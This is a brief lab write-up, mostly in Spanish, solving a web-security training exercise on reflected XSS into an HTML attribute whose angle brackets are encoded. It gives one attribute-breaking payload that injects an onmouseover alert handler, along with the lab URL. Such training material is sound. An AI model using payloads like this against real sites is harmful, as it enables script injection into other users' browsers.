# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

```jsx
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
```

Verificamos que el input que ingresamos, se refleja en el titulo de la busqueda

![image.png](Lab%20Reflected%20XSS%20into%20attribute%20with%20angle%20bracke%20fe74ac0c959d43e687683dd539b43f1c/image.png)

Por ende, probamos con estos payloads

1. `"onmouseover="alert(1)`

[https://0a410097038d61b2832f8bee000a009e.web-security-academy.net/?search="onmouseover%3D"alert(1)](https://0a410097038d61b2832f8bee000a009e.web-security-academy.net/?search=%22onmouseover%3D%22alert%281%29)

![image.png](Lab%20Reflected%20XSS%20into%20attribute%20with%20angle%20bracke%20fe74ac0c959d43e687683dd539b43f1c/image%201.png)